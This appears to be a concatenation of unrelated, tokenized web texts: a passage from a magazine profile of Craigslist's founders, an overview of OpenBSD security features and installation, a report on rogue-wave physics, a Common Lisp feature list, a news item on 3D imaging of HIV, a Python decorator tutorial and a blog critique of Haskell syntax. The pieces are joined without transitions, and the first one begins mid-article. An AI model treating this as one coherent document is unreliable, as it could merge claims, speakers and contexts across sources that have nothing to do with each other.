Buckmaster rides around in his girlfriend ’s old Volvo .
Newmark has a fancyish midsize house in the city , Buckmaster and his girlfriend share a fancyish rental in Marin .
But both men seem indifferent to material things .
Their indulgences have been big televisions .
From time to time , young people write Newmark with deep gratitude .
“ Craig … I know that you care about me , ” one wrote .
“ You must , after all you ’ve done for me … You ’ve found me places to live , bought and sold a bunch of my stuff , gotten me laid , gotten me off my lazy ass and out on the town , listened to me bitch , given me wonderful advice , and taught me so much about people .
Craig , I owe you so much …
Please keep your list as cool as it is today …
Please keep the space free of commercial ads .
Please do n’t sell out , Craig .
I ’ll love you forever , just keep it real . ”
That anonymous poster was alarmed by the report a year and a half ago that Phillip Knowlton , the former staffer to whom Newmark had given shares , sold them to eBay for a reported $ 5 million .
The two companies say they have a good relationship .
Newmark will call contacts at eBay , for instance , when he needs a personal connection at an ISP to track down what he calls “ a bad guy . ”
Another theory goes that eBay is studying Craigslist so that it can eat it alive .
It ’s not the only one with an appetite .
Google has recently come up with Google Base .
Overseas , eBay already has Kijiji .
Microsoft is trying , too .
“ You know there are roomfuls of guys at Microsoft , Google , and eBay thinking , How can we beat Craigslist ? ” Gibson says .
They may never be able to replace Craigslist ’s cultural cachet , but they might be more efficient and undermine the list that way .
The power of the Net could be used to sort out trustworthy from untrustworthy reporters .
“ I ’m just trying to make newsrooms stronger , ” he said .
The staff of nineteen is not going to outprogram anyone .
“ We ’re on the trailing edge of the technology , never on the bleeding edge , given the size of our staff , ” Buckmaster concedes .
“ But we can adopt new technology as well as anyone else can , and our users have always given us the benefit of the doubt in terms of getting bugs fixed .
And our values are appealing .
If you try to run something similar to us and subtract the sincere mission and philosophy or , worse , try to fake it , I ’m sure that ’s not going to work .
“ But then , if something better comes along , so be it .
People will be better off .
It does n’t have to be us .
Our egos are not that big . ”
In the situation comedy that Craig Newmark renders of his life , he is ruled by three looming faceless female figures : “ the girlfriend , ” “ the decorator , ” and “ the nutritionist , ” the last of whom issued strict orders to “ step away from the buffet table ” and keep his pedometer count above 8,000 steps a day .
None of the triumvirate , however , told him to bite his tongue , and in England , Newmark spoke openly about the stealth media venture he has invested in to promote citizen journalism .
The power of the Net could be used , he said , to help sort out trustworthy from untrustworthy reporters , and promote stories that were important but not getting attention from the mainstream media , in which people were losing trust anyway .
The epicenter of this erosion , Newmark told me when I spoke with him just before the conference , is the White House press room , which let us down over Iraq .
“ We need the corps to back up Helen [ Thomas , the columnist , who opposed the invasion from the start ] . ”
Newmark ’s remarks were perceived as a “ slam ” at the mainstream media , and he was soon backtracking .
We need trained journalists and editors and fact - checkers , he said .
We need big newsrooms .
“ I ’m just trying to make newsrooms stronger , ” he said when I saw him in December .
Then he went on to deny that Craigslist was having any effect on newspaper revenues .
“ Somebody invented recently a myth that we ’re hurting newspapers .
I ’ve done a lot of research .
That appears to be an invention …
We ’re a minor factor . ”
The more honest response is that the Internet is undermining newspaper readership , and if it was n’t Craigslist , something else would be driving the business to the wall .
But Newmark is so wedded to the idea that he is just giving people a break , he ca n’t acknowledge any downside to his achievement .
In fact , with all the considerable earnestness he can summon , Newmark says that his prospective journalism project ( more an online ombudsman at this point than an actual newspaper ) is an act of altruism .
Jeff Jarvis says that newspapers need to upend newsroom culture and “ face the strategic imperative of gathering and sharing news in new ways across all platforms . ”
That means working with citizen providers of information .
“ Newspapers need to find ways to share learning , promotion , information , and revenue with citizen journalists . ”
You heard that : revenue .
Another thing newspapers have to yield is their reservoir of trust .
The big media have looked on that reservoir as a monopoly holding , says NYU ’s Jay Rosen — so much so that they wrote off Craigslist in the belief that the public would consult classified ads only in a newspaper they trust .
Now that the Internet is creating avenues for interactive journalism , newspapers have to accept that citizens can be trustworthy , too , or fall hopelessly behind the trend .
The response from newsmen is that reporting news is an expensive operation .
John Morton , the newspaper analyst , says , “ The economic infrastructure of the newspaper , I would point out , is the only one anywhere that supports mass coverage of news .
In every town and city in America — only newspapers do it , only newspapers are organized to do it .
However badly done , that needs to be done . ”
The Chronicle ’s Saracevic beats the same drum : “ There has been a social contract for hundreds of years — news - gathering organizations derive revenue from community advertising .
Well , Craigslist is changing that equation .
That symbiotic relationship is over .
Who ’s going to step forward to support news - gathering ? ”
One of the things Newmark talks about in the context of his journalism plans is a trust - and - ratings system similar to eBay ’s .
For my part , I wonder whether the eBay reputation ratings ( in which people routinely pressure or blackmail one another to maintain good reputations ) could n’t result in virtual stonings , or shunnings of the sort that took place in the narrow - minded Winesburg , Ohios , of old ( from which corporate urban life liberated us ) .
But at least Newmark and the other nerds are having the conversation .
Most news execs are still on the sidelines .
On the last of several public - transit trips I took with him , this one on the N - Judah line , the Exploder of Journalism took the long view .
“ In historical terms , the information age is just starting .
Two hundred years is my time frame .
I figure the decisions people make now on the Net will have effects that will resonate for a couple of centuries .
Just like decisions made in the late 1600s — those effects reverberated for a couple of centuries . ”
“ What were the big developments in the late 1600s ? ”
“ In politics .
In scientific investigation .
Intellectual thought .
The arts .
And — something called newspapers .
My reading of things is that Fleet Street became a big deal roughly in that time frame .
And ” —he rolled his head back — “ coffee . ”
We got off near the ballpark .
Having spent many hours with me , Newmark seemed finally to remember my name .
But I ’d noticed that none of the enthusiastic things I ’d had to say about Craigslist , or the things I ’d heard others say to him , seemed to reach him .
There was an emotional ziplock around Newmark , the inability to take any kind of love as his own and grow from it .
Maybe that ’s why he started the list .
When I asked him why he could n’t accept the love , he referred me to what he called “ basically my liturgy ” : Leonard Cohen .
And specifically three lines from the song “ Bird on a Wire ” that Newmark could n’t even say aloud : “ I swear by this song / and by all that I have done wrong / I will make it all up to thee .
” ( Huh — that ’s a lot of guilt . )
I told him my favorite lines from the song .
The singer sees a beggar on a crutch , who tells him he ’s asking for too much .
Then he sees a woman in a darkened door —
“ Hey , why not ask for more ? ”
That ’s America .
We move on past the guy on the crutch , we ca n’t count our blessings .
We always want more .
Or maybe it ’s the human condition .
I asked Newmark where he stood on that issue — did he want enough , or more ?
He paused , rolled his head back .
“ I wish I had misbehaved more in college . ”
Take a closer look at OpenBSD
Security where it counts
When security is of the utmost importance , it 's only logical to look to the same operating system that spawned today 's standard in secure remote access , OpenSSH ( Open Secure Shell ) .
OpenSSH is just one part of OpenBSD , a distribution that has focused on security from the ground up , accomplishing a goal of creating a UNIX ® - like operating system that is secure by default .
This stand is in contrast to most operating systems today , which require significant time and energy to harden the environment before going live .
In fact , OpenBSD is so secure that it was once banned for use in a DEF CON competition , where crackers go after each other 's systems .
An overview of BSD
Berkeley Software Distribution ( BSD ) is one of the oldest and most common flavors of UNIX .
Today , it has been split into multiple versions , with three common open source distributions leading the way :
FreeBSD
OpenBSD
NetBSD
While FreeBSD is the most widely used of the three distributions , each version has significant upsides that make choosing the correct solution an important decision .
FreeBSD is the most general of the three and thrives in i386 environments .
When security is the highest item on your priority list , OpenBSD is the right distribution .
NetBSD offers a small and extremely portable alternative , running on a huge variety of architectures .
The OpenBSD audit process
The OpenBSD audit process might be the biggest factor in the consistent security found in this distribution .
A team of experienced developers focused on auditing each piece of code entered into the source tree .
Codes are analyzed for security flaws as well as bugs in general -- bugs that might not affect general functionality but could be exploited as security flaws down the line .
Every bug is taken seriously and immediately addressed .
This proactive approach has kept OpenBSD from being susceptible to unknown exploits , which other distributions have to scramble to cover upon discovery .
OpenBSD : Where and when
Any environment in which security is important makes for a potential OpenBSD installation .
In today 's more security - conscious world -- a world in which computers are connected to the Internet 24x7 -- it 's hard not to find a user who does n't take security seriously , be it in a home , government , or corporate environment .
Financial juggernauts have been known to rely on OpenBSD to secure corporate networks and customer records .
OpenBSD might not have a huge user base compared to other UNIX - like operating systems , but it is installed at the most crucial points of many networks .
OpenBSD , being a close relative of NetBSD , also runs on a wide variety of hardware .

OpenBSD core packages and features
Now that you 've determined whether OpenBSD is an option for your hardware platform , let 's take a closer look at some OpenBSD highlights .
OpenSSH
The first package of note is OpenSSH , with which every UNIX and Linux® user is familiar .
However , many people might not know that it comes from OpenBSD developers .
OpenSSH was originally developed for OpenBSD and has since become the standard Secure Shell ( SSH ) package , ported for just about every version of the UNIX , Linux , and Microsoft ® Windows ® operating systems .
OpenSSH includes ssh for secure logins , scp for secure copies , and sftp -- a secure alternative to ftp .
All source code falls into the open source BSD license , following OpenBSD 's directive to keep all proprietary code and restrictive licensing schemes out of the distribution ( which was the initial impetus to create a new version of SSH ) .
Every piece of software included in OpenBSD is completely free , with no restrictions on use .
Cryptography
Because the OpenBSD project is based in Canada , no United States export restrictions on cryptography apply , allowing the distribution to make full use of modern algorithms for encryption .
Encryption can be found almost everywhere in the operating system , from file transfers to file systems to networking .
Pseudo - random number generators are also included in OpenBSD , which ensures that random numbers cannot be predicted based on the system state .
Other features include cryptographic hash functions , cryptographic transform libraries , and cryptographic hardware support .
Another heavily exported piece of OpenBSD is the IP Security Protocol ( IPSec ) , which the operating systems uses rather than relying on the inherently insecure TCP / IP Version 4 ( IPV4 ) .
( IPV4 chooses to trust just about everybody and everything . )
IPSec encrypts and validates packets to protect the privacy of data and to ensure that no changes are made to packets during the delivery process .
IPSec became an integral piece of the standard Internet Protocol with the introduction of TCP / IP Version 6 ( IPV6 ) , making the future of the Internet more secure by default .
OpenBSD as firewall
Because OpenBSD is both thin and secure , one of the most common OpenBSD implementation purposes is as a firewall .
Firewalls operate at the ground level of most secure locations , and OpenBSD 's implementation of packet filtering is top notch .
Packet Filter ( PF ) -- an open source solution designed by the OpenBSD development community -- is the OpenBSD method of choice .
Like many other pieces of OpenBSD software , its success has prompted the other BSD variants to port it into their own distributions .
OpenBSD is set up to be secure by default , so there are n't too many services that you must turn off to set up a rock - solid firewall .
You will have to enable a second Ethernet interface and configure PF to your needs .
See Related topics for links to articles on how to set up an OpenBSD server as a firewall .
Encryption and random numbers
Most operating systems include little or no encryption in key elements , which creates an inherent lack of security .
A big reason for this deficiency is the simple fact that most operating systems ship from the United States , where developers are n't allowed to export robust cryptographic software .
Cryptographic hash libraries in OpenBSD include MD5 , SHA1 , and RIPEMD160 .
Cryptographic transform libraries in OpenBSD include Blowfish , Data Encryption Standard ( DES ) , 3DES , and Cast .
Most of this cryptography operates behind the scenes , keeping users from having to become experts on cryptography to keep their systems safe .
The OpenBSD development team understands that most administrators are n't experts in security and should n't be expected to jump through hoops to harden their environment .
People who believe that OpenBSD is n't a user - friendly operating system are largely misinformed .
If most administrators spent the time to put OpenBSD 's default security measures in place on any other distribution , they would likely change their line of thinking .
Random numbers are a key component to making all this security happen .
The OpenBSD kernel uses interrupt information to create a constantly changing entropy pool that provides data to seed cryptographic functions and provide numbers for transaction IDs .
For instance , pseudo - random numbers are used for process IDs and packet IDs , which makes spoofing significantly more difficult for a would - be attacker .
OpenBSD even uses random port assignments in bind ( 2 ) system calls .
Most UNIX - derived operating systems either create IDs sequentially or have a simple algorithm that can be exploited by predicting results .
While the OpenBSD team is still exploring more extensive encryption of the file system , steps have been taken to encrypt data where possible .
The swap partition is divided into small sections , each encrypted with its own key , ensuring that sensitive data does n't leak into an insecure part of the system -- a common problem on a traditional UNIX - or Linux - based system .
If you want to encrypt user data , you can use Cryptographic File System ( CFS ) in OpenBSD .
CFS operates at the user level , communicating with the kernel through Network File System ( NFS ) .
The system gives users transparent access to encrypted directories , so they can choose what data is encrypted without being burdened by the encrypt / decrypt process .
Note : See Related topics for more information about cryptography in OpenBSD .
Installing OpenBSD
Without a full understanding of OpenBSD 's benefits , new users might lean toward a familiar Linux distribution because they 're intimidated by the BSD installation process , which has a reputation of being difficult .
While the installation might not be what most users are accustomed to , this article provides a quick overview of the process to demonstrate how easy setup can be .
Spending a bit of time to learn about the OpenBSD installation process to save hours locking down a Linux distribution that is n't secure by default is often the pragmatic decision .
There are several installation methods , and steps vary by platform .
I focus on a basic CD - ROM installation on an i386 server ( for example , a computer running an IBM server ) by creating your own CD set .
This process is not documented in the official FAQ .
Step 1 . Getting the distribution
First , visit the OpenBSD.org download page ( see Related topics ) , choose any mirror on the list , and then go to /3.9/i386 / .
This is the first place you 'll notice something different , if you 're used to installing Linux distributions .
The only .iso file is a 5 MB file called cd39.iso .
Can this be right ?
Do n't worry :
With an OpenBSD installation , the boot CD is a bare - bones kernel ; the rest is extracted from files that you can download and burn to an additional CD ( or purchase a CD set from OpenBSD.org to help support the project ) .
Make sure you download cd39.iso , all the .tgz files , bsd , bsd.rd , and bsd.mp .
( Or , to make things easy , just download everything in the directory . )
Step 2 . Create the installation media
Create a boot CD from cd39.iso and label it Disk 1 , as shown in Listing 1 .
Create a regular CD with all the other files in a directory called /3.9/i386 / , and label it Disk 2 , as shown in Listing 2 .
Other options include purchasing a CD set , performing a network installation , or building a custom .iso file , but I find the two - CD method easiest .
Listing 1 . Use cd39.iso to create a boot CD
cd39.iso 02-Mar-2006 03:10 4.6M
Listing 2 .
Put the following files in a directory called /3.9/i386 / on Disk 2
base39.tgz 02-Mar-2006 03:10 38.6 M bsd 02 - Mar-2006 03:10 5.2 M bsd.mp 02-Mar-2006 03:10 5.2 M bsd.rd 02 -Mar-2006 03:10 4.5 M comp39.tgz 02-Mar-2006 03:10 71.8 M etc39.tgz 02-Mar-2006 03:10 1.1 M game39.tgz 02-Mar-2006 03:10 2.5 M man39.tgz 02-Mar-2006 03:10 7.1 M misc39.tgz 02-Mar-2006 03:10 2.2 M xbase39.tgz 10 - Mar-2006 12:04 10.1 M xetc39.tgz 10 - Mar-2006 12:04 88 k xfont39.tgz 10 - Mar-2006 12:04 31.7 M xserv39.tgz 10 - Mar-2006 12:04 19.0 M xshare39.tgz 10 - Mar-2006 12:04 2.0M
Step 3 . Start the installation
After you 've created the installation CDs , boot the new server from Disk 1 .
Command prompts guide you through the installation process .
You can find detailed instructions in Section 4 of the OpenBSD FAQ ( see Related topics ) .
The most complicated part is the Setting up disks section , but you can skip a lot of this information by choosing to use all of the disk for OpenBSD ( if you do n't have any other partitions you would like to retain ) .
Regardless of your partitioning decision , make sure to follow the Creating a disklabel section step by step , with the only deviation being to create larger / usr and / home partitions , if you desire .
Note the two - layer partitioning system in OpenBSD .
The first step sets up traditional fdisk viewable partitions , while the second disklabel step sets up OpenBSD subpartitions .
Other than this , the only adjustment ( to use your two - CD installation set ) is to swap CDs at this step :
Let 's install the sets !
Location of sets ?
( cd disk ftp http or ' done ' ) [ cd ]
Switch from Disk 1 to Disk 2 ( the CD with all the files in /3.9/i386 / ) .
Step 4 . Start computing !
With everything set up , you 're ready to start computing .
Sounds great , now how do I use it ?
In contrast to learning how to secure your system ( which already has rational default settings ) , there are some steps that you might want to be aware of before you start administering your system as a new OpenBSD user .
First , by default , no users are included in the wheel group , which means that an attempt to use the su command will fail .
Create new users from the command line with the adduser command , which leads you through a simple question and answer session to set up defaults ( a one - time process ) and to create your first user .
Say , for example , that you created a user called bsdadmin .
If bsdadmin is going to be your primary administrative account , you want to be able to use the su command to access the root account quickly .
To do this , log in under the root account , and then edit the /etc / group file to include bsdadmin in the wheel group .
Simply append bsdadmin to the first line ( the one that says wheel : *:0 : root ) .
Second , check the system default settings in the /etc/ directory .
Tread carefully here , as most services are turned off by default for a reason .
OpenBSD uses rc.conf to launch most startup daemons .
You 'll see that services , such as httpd and nfs , are turned off by default -- even PF is off .
As an example , you can turn Apache ( httpd ) on by adding the line httpd=YES to /etc/rc.conf .
While OpenBSD might not have graphics - based tools to help in system administration , the OpenBSD developers have given extra attention to providing extensive , accurate man pages for each component of the operating system .
I recommend that you make liberal use of the stalwart man command any time you 're confused or simply want to learn about a new tool .
What else can I do with it ?
OpenBSD comes prepackaged with a small set of third - party components , again focusing on security and stability rather than trying do everything for everybody .
Here 's the default list of packages included in OpenBSD Version 3.9 :
OpenSSH Version 4.3
X.org Version 6.9.0 ( with V3.3 XFree86 servers included in i386 distributions )
GCC Versions 2.95.3 and 3.3.5 ( with Propolice stack protection technology enabled by default )
Perl Version 5.8.6 ( with patches and improvements from the OpenBSD team )
Apache Version 1.3.29
Web server ( including mod_ssl Version 2.8.16 and Dynamic Shared Object ( DSO ) support )
OpenSSL Version 0.9.7g ( with patches and improvements from the OpenBSD team )
Groff Version 1.15
Sendmail Version 8.13.4 ( with libmilter )
BIND Version 9.3.1 ( with improvements in chroot operation and other security - related issues )
Lynx Version 2.8.5rel.4 ( with HTTP over Secure Sockets Layer ( HTTPS ) support added and patches from the OpenBSD team )
Sudo Version 1.6.8p9
Ncurses Version 5.2
KAME IPv6
Heimdal Version 0.7 ( with patches )
Arla Version 0.35.7
gdb Version 6.3
Additional third - party packages are available , and you can easily install them with OpenBSD 's pkg_add application .
You can find full lists in the /3.9 / packages /i386 / directory on OpenBSD mirrors .
The pkg_add application takes a package name as input , automatically determines dependencies , and installs all necessary packages .
While the packages listed above have been specifically ported for OpenBSD , another tenet of the platform is binary compatibility .
OpenBSD supports binary emulation for most software compiled for Linux , Solaris , HP - UX , and other forms of BSD .
This functionality is turned off by default .
To turn it on , simply restart your system after removing the leading comment ( # ) character from /etc/sysctl.conf on the following line :
#kern.emul.linux=1 # enable running Linux binaries
In this way , you can run simple , statically - linked Linux applications .
To run a wider variety of software , also install the Redhat / base package using pkg_add as described above .
Wrap-up
OpenBSD strives to be the most secure UNIX derivation on the planet , and not much is left to be desired .
Design principles , such as code auditing , extensive use of encryption , and careful configuration choices , combine to ensure OpenBSD 's secure by default philosophy holds true .
While it is most common to find OpenBSD installations in secure servers and firewalls , OpenBSD 's wide hardware and software support makes the operating system suitable for a large range of purposes .
UNIX and Linux gurus alike will find many parts of OpenBSD familiar , and they will likely appreciate the areas in which it purposely strays from the pack .

A freak wave approached this oil freighter , the Esso Languedoc , near Durban , South Africa in 1980 .
The masts are about 82 feet above sea level , but the wave , which broke over the deck , caused only minor damage .
Photo credit : Philippe Lijour .
On a stormy April day in 1995 , the RMS Queen Elizabeth 2 was sailing in the North Atlantic when the ocean liner dipped into a " hole in the sea . "
Out of the darkness , a towering 95 - foot wave threatened to crash down upon the vessel , which the 70,000 - ton ship attempted to surf in order to avoid being pummeled to the bottom of the ocean .
Fortunately , the ship and passengers survived , but the instance occurred just months after the first scientific recording confirmed the validity of old sailors ' tales once considered skeptical : the existence -- and prevalence -- of freakishly giant waves , also known as rogue waves .
Before the first laser measurement of a freak wave in January 1995 , oceanographers and mathematicians predicted that such monster waves should only occur about once every 10,000 years .
But as the occurrence inspired satellite measurements , scientists observed many more freak waves than theory predicted .
In fact , observations imply that a handful of these waves is occurring at every moment somewhere on the ocean .
Although it 's controversial just how many ships and lives have been lost in modern times due to these fairly common giant waves , most ships today are only built to withstand waves up to 50 feet tall -- while freak waves have been calculated to reach heights of up to 198 feet .
Technically , a freak wave is defined as a wave that is twice the " significant wave height , " which is the mean of the largest third of waves in an area .
Intrigued and terrified by freak waves and their potential for swallowing giant ships whole ( from oil rigs to cruise ships ) , scientists are trying to formulate a theory or theories to describe the evolution of these mythical realities .
Recently , scientists from Sweden and Germany , Padma Shukla et al. , have presented the first analysis and simulation of its kind for the instability of nonlinear waves interacting in deep water .
In the past , nonlinear theories have seemed capable of explaining the greater prevalence of rogue waves than previous theories which were linear .
" The basic reason for the occurrence of freak waves seems to be what is known as nonlinear wave interactions -- by a certain mechanism there is an energy exchange between the waves resulting in a large growth in wave amplitude , much larger than what would be possible through ordinary linear superposition of waves , " coauthor Mattias Marklund told PhysOrg.com .
Nearly all waves originate as ripples on the water 's surface blown by the wind .
( The exception is tsunamis , which are caused by seismic tremors on the ocean floor and only become dangerous when they reach the shore . )
Most waves , however , die down due to viscosity in the water , unless heavy winds cause the swells to increase .
Scientists believe that heavy winds -- especially when blowing in the opposite direction of the water current -- play a large role in forming freak waves .
This idea may explain why locations with strong currents ( e.g. the Agulhas off Africa and Gulf Stream off the U.S. , including the Bermuda Triangle ) have a history of reported freak waves .
" The freak wave a phenomenon is important to understand since it may be the cause of serious accidents involving oil platforms and ocean - going ships , " said Marklund .
" If a greater understanding of the mechanisms behind these waves is obtained , one may , for example , in the future combine this with observational and statistical tools in order to construct warning systems . "
Shukla , Marklund and their colleagues built their theory on a two - wave system , where two waves interact nonlinearly , which is described by the Schrodinger equations .
These quantum mechanics equations , originally developed to describe the wave - like behavior of electrons in atoms , have since been used for a variety of wave systems .
The scientists found that two - wave cases behave much differently than single waves , which exhibit standard instabilities and dissolve into a wide spectrum of waves .
" We have presented a theoretical study of the modulational instabilities of a pair of nonlinearly interacting two - dimensional waves in deep water , and have shown that the full dynamics of these interacting waves gives rise to localized large - amplitude wave packets , " wrote the scientists in a recent issue of Physical Review Letters .
" [ T ] wo water waves can , when nonlinear interactions are taken into account , give rise to novel behavior such as the formation of large - amplitude coherent wave packets with amplitudes more than 3 times the ones of the initial waves . "
Using the Schrodinger equations , the scientists studied the impact of different wave speeds and different angles at which two waves intersect .
The team found that for a certain , relatively small angle , a new instability arises with a " maximum growth rate that is more than twice as large as the ones for the single wave cases , " they report .
Two waves meeting at such an angle would escape normal stabilizing effects and exhibit constructive interference that would result in a freak wave .
Strong currents can help further by " focusing " waves , continually building them up to giant sizes .
" This particular piece of research describes a possible mechanism behind rogue wave formation , " said Marklund .
" In order to statistically predict their location , one will need further observations and analysis of such data using various methods , in particular statistical analysis and computer simulations . "

Common Lisp Language Overview
Common Lisp has long been the leading language for software research and advanced development projects .
Its ability to tackle the biggest problems is unmatched .
Common Lisp is rich in data types , supported by a high - level language model and garbage collection .
In Common Lisp , all data are represented as objects .
There are no out - of - language errors .
This model encourages a high - level view of programs and an exploratory programming process that make Lisp programmers among the most productive in the world .
Evidence for this is presented in Erann Gat 's paper Lisp as an Alternative to Java
Common Lisp has grown and evolved over time , acquiring features and supporting paradigms as they 've entered the world of computer science .
It is now supported by an ANSI standard ( ANSI X3.226:1994 ) .
This standard includes the Common Lisp Object System ( CLOS ) ; features like multimethods and dynamic class redefinition make CLOS among the most advanced object systems in the world .
Among the most important features of Common Lisp are :
Machine - independent language model .
All operations are performed in terms of program objects , not raw bits .
Iterative design process .
Common Lisp supports exploratory programming , making programmers more productive .
Dynamic patching .
Common Lisp programs can be updated while they are running .
The ability to install field patches without interrupting service is important for many mission - critical applications .
High - level debugging .
All debugging is performed within the language model , preventing system crashes and other out - of - language errors .
Common Lisp Object System ( CLOS ) .
Common Lisp provides advanced object - oriented programming , including multiple inheritance , multimethods , class redefinition in running programs , and dynamic type creation .
No other language provides an object system so rich in features .
First class functions and classes .
First class higher - order functions provide control systems that are elegant and powerful .
First class classes let you manipulate the object system in running programs , giving you finer degrees of control .
Extensive data types .
Objects , structures , lists , vectors , adjustable arrays , hash - tables , and symbols are just a few of Common Lisp 's myriad data types .
Advanced numeric types .
The Common Lisp arithmetic package includes unlimited size integers , fractions , complex numbers , and a complete floating point library .
Conversion between numeric types occurs automatically .
Complete IO library .
Common Lisp includes a portable interface for streams , the file system , and other IO facilities .
Extensive control structures .
Complex looping , guard expressions , non-local transfer of control and lexical closures are among the control structures offered by Common Lisp .
Condition system .
The Common Lisp condition system is object - based , and supports recovery as well as escape from errors and other exceptional situations .
Consistent syntax .
Common Lisp uses a simple consistent syntax that is easy to learn and easy to use from day one .
Macros .
A convenient macro system lets Common Lisp programmers create embedded languages , essentially turning their Lisp environment into a domain - specific problem solving tool .
Programs as data .
Common Lisp is a fully reflective language , supporting genetic algorithms , evolutionary programming , and other self - referential programming techniques .
Late - bound types .
By leaving type declarations to the programmer 's discretion , programs can be simpler and prototyping faster .
For more information on Common Lisp , see our external resources page .
Aids affects 40 million people across the world
Enlarge Image
The variable size and shape of HIV has made it hard to map , the team said in the journal Structure .
So the UK - German team took hundreds of images of viruses , that are 60 times smaller than red blood cells , and used a computer program to combine them .
Oxford University 's Professor Stephen Fuller said the 3D map would assist in understanding how the virus grows .
Unusual features
He told the BBC : " You say can you show me the structure of the HIV virus and the question is which one .
" HIV is very variable .
It varied in diameter by a factor of three . "
The way the research team , from the Wellcome Trust Centre for Human Genetics at Oxford University , dealt with this was by taking multiple images at different tilts .
Working with colleagues in Heidelberg and Munich , they took about 100 images of 70 individual HIV viruses and then looked at similarities .
Despite the variability , the team found some consistent features .
T cells
This included the finding that the core of virus - which is cone - shaped - spans the width of the viral membrane .
But there are spikes on the outside which bind to human immune cells , called T cells , and allow the virus to invade them .
The significance of this is that whereas most viruses have internal structures which define the size , in the HIV virus it is the membrane which defines the size .
This could inform the development of more effective therapeutic approaches
Professor Stephen Fuller
Wellcome Trust Centre for Human Genetics
This puts constraints on the way it can assemble , the team said .
Professor Fuller said : " Identifying how the virus grows will allow us to address the formation of this important pathogen and how it accommodates its variability .
" This could inform the development of more effective therapeutic approaches , " he added .
But Professor Fuller , who continues to work on HIV , acknowledges that a new HIV vaccine or treatment resulting from his research was a long way off .
But he says the research could provide an insight into the way to prevent the virus from assembling .
Treatments ?
Like any virus , HIV is not a cell but rather strands of genetic code wrapped in protein .
The virus invades living cells and take them over by usurping the cell 's genetic code with its own .
Roger Pebody , treatment specialist at HIV / Aids charity Terrence Higgins Trust , said : " Revealing the 3D structure of HIV may not sound very exciting but it 's actually really useful , giving us more information about the virus and how it grows .
" The more we understand about HIV , the more likely we are to be able to develop effective treatments and hopefully one day a cure . "
Introduction
On quite a few occasions I would find myself coding Python object initialiser methods where I would manually copy the method parameters to object attributes in order to make use of them later ( see e.g. The HardWay : : __init__( ) , lines 13 – 17 below ) .
This is an unnecessary laborious , error - prone and unpythonic activity 🙂
In this article I hence present an alternative and more pythonic solution : a function decorator that copies initialiser method parameters to object attributes ( see lines 19 – 24 below for an example showing how that decorator is used ) .
Furthermore , this article shows how to devise Python function decorators that require additional data ( beyond the function that is to be decorated ) in order to be useful .
Last but not least , the decorator to be shown in ( part 3 of ) this article is most useful in conjunction with initialiser methods but there is nothing to prevent you from using it with any object method .
Warm - up exercise
Again , the code section below ( lines 13 – 17 ) shows how to copy the parameters to object attributes in a manual fashion .
1 #!/usr/bin/env python 2 " " " Demo code for initialiser method decorator " " " 3 4 # Copyright : ( c ) 2006 Muharem Hrnjadovic 5 # created :
15/10/2006 11:21:01 6 __version__ = " $ Id$ " 7 # $ HeadURL $ 8 9 import pprint as PP , sys 10 from p2adeco import Params2attribs 11 12 class TheHardWay ( object ) : 13 def __init__ ( self , arg_a , arg_b , arg_c ) : 14 self.arg_a = arg_a 15 self.arg_b = arg_b 16 self.arg_c = arg_c 17 # .. now do whatever initialisation is required ..
The alternative solution below uses a python function decorator ( on line 19 ) which is given a ( possibly empty ) tuple of parameter names for which no copying should occur .
In this particular example we do n’t want arg_3 to be copied and hence specify it in the tuple passed to the decorator ’s object initialiser .
Please note also that the decorator is capable of handling embedded parameter lists ( like e.g. parameters arg_2 and arg_3 which are passed to the decorated initialiser via such a list ( on line 20 ) ) .
18 class CoolApproach ( object ) : 19 @Params2attribs (( ' arg_3 ' , ) ) 20 def __init__ ( self , arg_1 , ( arg_2 , arg_3 ) , arg_4 , arg_5 ) : 21 # .. at this point all parameters except for ' arg_3 ' have been 22 # copied to object attributes 23 # .. now do whatever initialisation is required .. 24 print " >>
In initialiser , self.arg_1 = ' %s ' " % self.arg_1
Finally , the block below merely instantiates a CoolApproach object ( line 27 ) in order to demonstrate the described decorator behaviour .
Line 28 sorts the attributes of the newly instantiated object for clarity .
25 if __name__ == ' __main__ ' : 26 embedded_params = ( ' E1 ' , ' E2 ' ) 27 obj = CoolApproach ( ' aa ' , embedded_params , 22 , 3.33 ) 28 sorted_attributes = sorted ( obj.__dict__.iteritems ( ) ) 29 sys.stdout.write ( " \
Object attributes : \
%s \
" % 30 PP.pformat ( sorted_attributes , indent=4 , width=60 ) )
When running the code above the following output results :
>>
In initialiser , self.arg_1 = ' aa '
Object attributes : [ ( ' arg_1 ' , ' aa ' ) , ( ' arg_2 ' , ' E1 ' ) , ( ' arg_4 ' , 22 ) , ( ' arg_5 ' , 3.3300000000000001 ) ]
From the output we can see that :
the CoolApproach initialiser method was entered ( print statement on line 24 ) all the desired initialiser parameters were copied to attributes of the respective object ( print statement on lines 29 – 30 )
Please note also that arg_3 is not listed as an attribute in the output above indicating that the decorator is paying attention to the parameter exclusion list passed to it .
Conclusion
This is the end of part one , the next part of this article introduces the Python decorator mechanics needed for the final part ( dissecting the Params2attribs decorator )

Learning Haskell is hard .
Those who disagree with this basic premise should stop reading now ; they 're obviously far more talented and intelligent than I am .
However , wrapping your mind around the concepts is just one part of the difficulty .
I believe that the syntax itself contributes to the difficulty of reading and understanding Haskell .
I think that there are some parts of Haskell 's syntax that are meant to be clever and flexible ; however , this same flexibility leads them to be difficult to decipher .
Unfortunately , I fear the only ones who are going to read this post are the ones most likely to disagree with it , but I 'm going to try anyway ;) Function applicationI think " f( a , b ) " more clearly portrays function application than " f a b " does .
Consider " map myFunc a " .
It 'd be a lot visually clearer which function was getting called and which function was being passed if it were written " map( myFunc , a ) " .
The syntax for curryingI think the currying syntax is terrible .
Consider " unwords .
map showVal " .
This is a curry because map takes two arguments .
Now consider " unwords . spam showVal " .
Is this a curry ?
Who knows ?
Unless you understand the type signature for " spam " , you do n't know .
I think it 's important for the syntax of a language to help you decipher code even if you are n't familiar all the libraries being used .
For instance , Haskell does this by forcing you to use upper case names for types , and I think this was an improvement over C. I think you should have to * work * to make a curry happen , and it should be obvious to the reader what is happening .
Perhaps " unwords . curry ( map , showVal ) " would be clearer .
Function type declarationsSimilarly , the syntax " f :: a -> b -> c " places the burden of currying on you when it's often the case that you are n't even thinking about currying .
It 'd be a lot clearer to just say " f :: ( a , b ) -> c " .
This does n't stop you from using currying ; it just frees you from having to think about it when you 're not actually using it yet .
If you actually are writing a function that returns another function , say that !
For instance , " f :: ( a ) -> ( ( b ) -> c ) " .
Now the reader will know that you plan on actually returning a function without the issue of currying getting in the way .
Point free stylePoint free style can be elegant .
For instance , consider " h = f . g " .
This says that " h " is " f of g " , and it 's more elegant than " h x = ( f . g ) x " .
